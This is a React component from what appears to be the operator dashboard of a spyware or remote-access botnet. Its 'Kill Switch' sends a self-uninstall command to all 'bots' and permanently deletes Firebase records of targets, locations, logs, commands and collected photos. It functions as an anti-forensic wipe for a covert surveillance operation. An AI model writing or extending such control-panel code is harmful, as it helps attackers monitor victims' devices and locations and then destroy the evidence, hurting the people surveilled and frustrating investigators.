/**
 * Kill Switch Component - Emergency Self-Uninstall & Data Wipe
 * 2-Step Verification for security
 */

'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { AlertTriangle, ShieldAlert, X, Terminal, Trash2 } from 'lucide-react';
import { Card } from '@/components/ui/Card';
import { Button } from '@/components/ui/Button';
import { Device } from '@/types';
import { ref, remove } from 'firebase/database';
import { database, FIREBASE_PATHS } from '@/lib/firebase';
import { useKillSwitch } from '@/hooks/useFirebase';
import { toast } from '@/lib/toast';

interface KillSwitchProps {
  devices: Device[];
}

export function KillSwitch({ devices }: KillSwitchProps) {
  const [step, setStep] = useState<0 | 1 | 2>(0);
  const [confirmText, setConfirmText] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const { mutate: sendKillCommand } = useKillSwitch();

  const handleFullWipe = async () => {
    if (confirmText !== 'ERASE_ALL_DATA') {
      toast.error('Konfirmasi teks salah');
      return;
    }

    setIsExecuting(true);
    try {
      // 1. Send self-uninstall to all devices
      const deviceIds = devices.map(d => d.id);
      sendKillCommand(deviceIds);

      // 2. Wipe Firebase Database nodes
      await Promise.all([
        remove(ref(database, FIREBASE_PATHS.ACTIVE_TARGETS)),
        remove(ref(database, FIREBASE_PATHS.LOCATIONS)),
        remove(ref(database, FIREBASE_PATHS.SYSTEM_LOGS)),
        remove(ref(database, FIREBASE_PATHS.COMMANDS)),
        remove(ref(database, 'kei-vault/photos_list'))
      ]);

      toast.success('System Wipe Successful. All data erased.');
      window.location.reload();
    } catch (error) {
      toast.error('Wipe failed: ' + error);
    } finally {
      setIsExecuting(false);
      setStep(0);
    }
  };

  return (
    <>
      <Card className="border-red-500/30 bg-red-950/10 p-6 backdrop-blur-md">
        <div className="flex flex-col md:flex-row items-center justify-between gap-6">
          <div className="flex items-center gap-4">
            <div className="h-14 w-14 rounded-2xl bg-red-500/20 flex items-center justify-center text-red-500 shadow-lg shadow-red-500/20">
              <ShieldAlert size={32} />
            </div>
            <div>
              <h3 className="text-xl font-bold text-red-500 font-mono tracking-tighter">PROTOCOL: KILL SWITCH</h3>
              <p className="text-xs text-slate-400 font-mono mt-1">
                Emergency self-destruct for {devices.length} active nodes.
              </p>
            </div>
          </div>

          <button
            onClick={() => setStep(1)}
            className="w-full md:w-auto px-8 py-3 bg-red-600 hover:bg-red-500 text-white rounded-2xl font-bold font-mono transition-all active:scale-95 shadow-lg shadow-red-600/30"
          >
            ACTIVATE
          </button>
        </div>
      </Card>

      <AnimatePresence>
        {step > 0 && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/95 backdrop-blur-xl">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
            >
              <div className="max-w-xl w-full bg-slate-900 border border-red-500/50 rounded-[32px] p-8 shadow-2xl shadow-red-500/10">
              <div className="flex justify-between items-start mb-6">
                <div className="h-12 w-12 rounded-xl bg-red-500/10 flex items-center justify-center text-red-500">
                  <AlertTriangle size={24} />
                </div>
                <button onClick={() => setStep(0)} className="text-slate-500 hover:text-white transition-colors">
                  <X size={24} />
                </button>
              </div>

              {step === 1 ? (
                <div className="space-y-6">
                  <div>
                    <h2 className="text-2xl font-bold text-white mb-2">Verification Step 1</h2>
                    <p className="text-slate-400 text-sm leading-relaxed">
                      Anda akan mengaktifkan **Kill Switch**. Tindakan ini akan:
                      <br />• Mengirim perintah self-uninstall ke semua bot.
                      <br />• Menghapus seluruh database di Firebase secara permanen.
                      <br />• Membersihkan dashboard dari semua target.
                    </p>
                  </div>
                  <Button
                    className="w-full bg-red-600 hover:bg-red-500 h-14 text-lg"
                    onClick={() => setStep(2)}
                  >
                    Saya Mengerti, Lanjutkan
                  </Button>
                </div>
              ) : (
                <div className="space-y-6">
                  <div>
                    <h2 className="text-2xl font-bold text-red-500 mb-2">Final Verification</h2>
                    <p className="text-slate-400 text-sm mb-4">
                      Ketik <span className="text-white font-mono bg-white/5 px-2 py-0.5 rounded">ERASE_ALL_DATA</span> untuk mengonfirmasi penghapusan total.
                    </p>
                    <div className="relative">
                       <Terminal className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                       <input
                         type="text"
                         className="w-full bg-black/50 border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white font-mono focus:border-red-500 outline-none"
                         placeholder="Type here..."
                         value={confirmText}
                         onChange={(e) => setConfirmText(e.target.value)}
                         autoFocus
                       />
                    </div>
                  </div>
                  <div className="flex gap-4">
                    <Button variant="outline" className="flex-1 h-14 border-white/10" onClick={() => setStep(0)}>Batal</Button>
                    <Button
                      className="flex-1 h-14 bg-red-600 hover:bg-red-700"
                      disabled={confirmText !== 'ERASE_ALL_DATA' || isExecuting}
                      onClick={handleFullWipe}
                    >
                      {isExecuting ? 'Wiping System...' : 'EXECUTE WIPE'}
                    </Button>
                  </div>
                </div>
              )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </>
  );
}
